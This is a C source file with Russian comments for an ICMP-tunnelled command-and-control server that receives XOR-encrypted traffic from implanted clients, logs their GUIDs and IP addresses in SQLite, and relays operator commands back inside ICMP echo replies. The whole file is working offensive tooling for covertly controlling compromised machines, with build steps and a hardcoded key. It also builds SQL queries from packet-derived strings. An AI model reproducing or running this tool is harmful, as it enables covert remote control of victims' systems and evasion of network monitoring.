// sudo apt install libsqlite3-dev uuid-dev
// compile: gcc icmpsh.c -o icmpsh -lsqlite3
// В качестве ключа использовать любые символы кроме 0-9a-fA-F. Так как если в GUID и в ключе попадутся одинаковые символы, то в результате шифрования получится '\0' и шифрование оборвется

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sqlite3.h>
#include <regex.h>

#define IN_BUF_SIZE   1024
#define OUT_BUF_SIZE  128
#define MAX_GUID_LENGTH 40
#define DATABASE "session.db"

char usedGUID[MAX_GUID_LENGTH] = "";

// Функция шифрования XOR
void XORCipher(char* buf, int size, const char* key)
{
    int keyLen = strlen(key);
    for (int i = 0; i < size; i++) {
        buf[i] ^= key[i % keyLen];
    }
}

// Проверка целостности данных в ICMP-пакете
unsigned short checksum(unsigned short* ptr, int nbytes)
{
    unsigned long sum = 0;
    unsigned short oddbyte, rs;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

// Создать таблицу базы данных SQLite, если она не существует
int initialize_database() {
    sqlite3* db;
    char* zErrMsg = 0;
    int rc;

    rc = sqlite3_open(DATABASE, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return -1;

    }

    char* sql = "CREATE TABLE IF NOT EXISTS session (id INTEGER PRIMARY KEY AUTOINCREMENT, guid TEXT NOT NULL, ip_address TEXT NOT NULL);";

    rc = sqlite3_exec(db, sql, 0, 0, &zErrMsg);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
        sqlite3_close(db);
        return -1;
    }

    sqlite3_close(db);
    return 0;
}

// Функция для проверки существования записи guid и ip_address
int record_exists(sqlite3* db, const char* guid_str, const char* ip_str) {
    sqlite3_stmt* stmt;
    char sql[200];
    int rc;

    snprintf(sql, sizeof(sql), "SELECT COUNT(*) FROM session WHERE guid = '%s' AND ip_address = '%s';", guid_str, ip_str);

    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        return -1;
    }

    rc = sqlite3_step(stmt);
    if (rc != SQLITE_ROW) {
        fprintf(stderr, "Failed to execute statement: %s\n", sqlite3_errmsg(db));
        sqlite3_finalize(stmt);
        return -1;
    }

    int count = sqlite3_column_int(stmt, 0);
    sqlite3_finalize(stmt);

    // Если значение count больше 0, значит запись уже существует
    return count > 0;
}

// Функция для вставки GUID и IP-адреса в базу данных SQLite
int insert_data_to_database(const char* guid_str, const char* ip_str) {
    sqlite3* db;
    char* zErrMsg = 0;
    int rc;

    rc = sqlite3_open(DATABASE, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return -1;
    }

    // Проверьте, существует ли запись уже
    if (record_exists(db, guid_str, ip_str)) {
        sqlite3_close(db);
        return 0;
    }

    char sql[200];
    snprintf(sql, sizeof(sql), "INSERT INTO session (guid, ip_address) VALUES ('%s', '%s');", guid_str, ip_str);

    rc = sqlite3_exec(db, sql, 0, 0, &zErrMsg);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
        sqlite3_close(db);
        return -1;
    }

    printf("[+] New Session GUID: %s, IP Address: %s\n", guid_str, ip_str);
    sqlite3_close(db);
    return 0;
}

// Функция для проверки формата полученного GUID
int validate_guid(const char* guid_str) {
    const char* guid_pattern = "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}";

    regex_t regex;
    int reti = regcomp(&regex, guid_pattern, REG_EXTENDED);
    if (reti != 0) {
        fprintf(stderr, "Failed to compile regex\n");
        return 0; // Неверный GUID
    }

    reti = regexec(&regex, guid_str, 0, NULL, 0);
    regfree(&regex);

    return reti == 0;
}

// Функция создания raw ICMP-сокета
int create_icmp_socket() {
    int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == -1) {
        perror("socket");
        return -1;
    }
    return sockfd;
}

// Функция отображения сессий
int displaySessions(sqlite3* db, const char* query) {
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        return -1;
    }

    printf("Sessions:\n");

    // Выполнение запроса и вывод результатов
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const char* id = (const char*)sqlite3_column_text(stmt, 0);
        const char* guid = (const char*)sqlite3_column_text(stmt, 1);
        const char* ip_address = (const char*)sqlite3_column_text(stmt, 2);
        printf("ID: %s | GUID: %s | IP: %s\n", id, guid, ip_address);
    }

    sqlite3_finalize(stmt);

    if (rc != SQLITE_DONE) {
        fprintf(stderr, "Failed to execute statement: %s\n", sqlite3_errmsg(db));
        return -1;
    }

    return 0;
}

// Функция для обработки команды run
void runCommand() {
    char in_buf[IN_BUF_SIZE];
    char out_buf[OUT_BUF_SIZE];
    unsigned int out_size;
    int nbytes;
    struct iphdr* ip;
    struct icmphdr* icmp;
    char* data;
    struct sockaddr_in addr;
    const char* key = "jkzswqtrynup"; // CHANGE IT

    int sockfd = create_icmp_socket();

    int flags = fcntl(0, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(0, F_SETFL, flags);
    printf("running...\n");

    while (1) {
        // Чтение данных от клиента
        memset(in_buf, 0x00, IN_BUF_SIZE);
        nbytes = read(sockfd, in_buf, IN_BUF_SIZE - 1);

        if (nbytes > 0) {
            // Получение ip и icmp заголовков и данных
            ip = (struct iphdr*)in_buf;
            if (nbytes > sizeof(struct iphdr)) {
                nbytes -= sizeof(struct iphdr);

                // Получение icmp заголовка
                icmp = (struct icmphdr*)(ip + 1);

                if (nbytes > sizeof(struct icmphdr)) {
                    nbytes -= sizeof(struct icmphdr);

                    // Получение данных
                    data = (char*)(icmp + 1);

                    // Расшифровка данных XOR
                    XORCipher(data, nbytes, key);
                    size_t guid_length = 36;

                    // Получение GUID из данных
                    if (nbytes >= guid_length) {
                        char guid_str[40];
                        strncpy(guid_str, data, guid_length);
                        guid_str[guid_length] = '\0';

                        // Проверка, содержит ли полученный пакет действительный GUID
                        if (validate_guid(guid_str)) {

                            // Получение IP-адреса
                            char ip_str[INET_ADDRSTRLEN];
                            if (inet_ntop(AF_INET, &(ip->saddr), ip_str, INET_ADDRSTRLEN) != NULL) {

                                // Вставка GUID и IP-адреса в базу данных SQLite
                                insert_data_to_database(guid_str, ip_str);

                                // Если GUID совпадает
                                if (strcmp(guid_str, usedGUID) == 0) {
                                    printf("[+] Session has already started: ");
                                } else {
                                    // GUID не совпадает
                                    continue;
                                }
                            }
                        }
                    }
                    // Вывод данных на консоль
                    data[nbytes] = '\0';
                    printf("%s", data);
                    fflush(stdout);
                }

                // Повторное использование заголовков
                icmp->type = 0;
                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = ip->saddr;

                    // Чтение данных из stdin
                nbytes = read(0, out_buf, OUT_BUF_SIZE);
                if (nbytes > -1) {
                    memcpy((char*)(icmp + 1), out_buf, nbytes);
                    out_size = nbytes;

                    // Шифрование данных XOR
                    XORCipher((char*)(icmp + 1), out_size, key);
                }
                else {
                    out_size = 0;
                }

                icmp->checksum = 0x00;
                icmp->checksum = checksum((unsigned short*)icmp, sizeof(struct icmphdr) + out_size);

                // Отправка ответа
                nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + out_size, 0, (struct sockaddr*)&addr, sizeof(addr));
                if (nbytes == -1) {
                    perror("sendto");
                    return;
                }
            }
        }
    }
}

// Функция для обработки команды use
void useCommand(const char* command) {
    int index;
    if (sscanf(command + 4, "%d", &index) == 1) {
        // Выбор сессии из БД
        sqlite3* db;
        int rc = sqlite3_open(DATABASE, &db);
        if (rc) {
            fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
            sqlite3_close(db);
            return;
        }

        const char* query = "SELECT id, guid, ip_address FROM session;";
        sqlite3_stmt* stmt;
        rc = sqlite3_prepare_v2(db, query, -1, &stmt, 0);
        if (rc != SQLITE_OK) {
            fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
            sqlite3_close(db);
            return;
        }

        int i = 1;
        while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
            if (i == index) {
                const char* id = (const char*)sqlite3_column_text(stmt, 0);
                const char* guid = (const char*)sqlite3_column_text(stmt, 1);
                const char* ip_address = (const char*)sqlite3_column_text(stmt, 2);
                strncpy(usedGUID, guid, MAX_GUID_LENGTH);
                usedGUID[MAX_GUID_LENGTH - 1] = '\0'; // Убедимся, что строка завершена нулевым символом
                printf("Selected client: ID=%s, GUID=%s, IP=%s\n", id, guid, ip_address);
                break;
            }
            i++;
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
    } else {
        printf("Invalid client id.\n");
    }
}

// Функция для обработки команды sessions
void sessionsCommand() {
    sqlite3* db;
    int rc = sqlite3_open(DATABASE, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return;
    }

    const char* query = "SELECT id, guid, ip_address FROM session;";
    if (displaySessions(db, query) != 0) {
        fprintf(stderr, "Failed to retrieve sessions from the database.\n");
    }

    sqlite3_close(db);
}

// Функция для обработки команды help
void displayHelp() {
    printf("help:\n");
    printf("  run      - run program\n");
    printf("  sessions - show sessions\n");
    printf("  use <id> - select session\n");
    printf("  help     - show help\n");
    printf("  exit     - close program\n");
}

// Функция для обработки команд
void handleCommand(const char* command) {
    // Обработка команды "run"
    if (strcmp(command, "run") == 0) {
        runCommand();
    }
    else if (strncmp(command, "use ", 4) == 0 || strcmp(command, "use") == 0) {
        // Обработка команды "use <id>"
        useCommand(command);
    }
    else if (strcmp(command, "sessions") == 0 || strcmp(command, "session") == 0) {
        // Обработка команды "sessions"
        sessionsCommand();
    }
    else if (strcmp(command, "help") == 0) {
        displayHelp();
    }
    else if (strcmp(command, "exit") == 0) {
        exit(0);  // Выход из программы
    }
    else {
        printf("Unknown command.\n");
    }
}

int main(int argc, char** argv)
{
    char input[50];

    // Отображение справки
    displayHelp();

    // Создание базы данных
    initialize_database();

    // Ввод команд
    while (1) {
        printf("Command>");
        fgets(input, sizeof(input), stdin);

        size_t len = strlen(input);
        if (len > 0 && input[len - 1] == '\n') {
            input[len - 1] = '\0';
        }

        handleCommand(input);
    }

    return 0;
}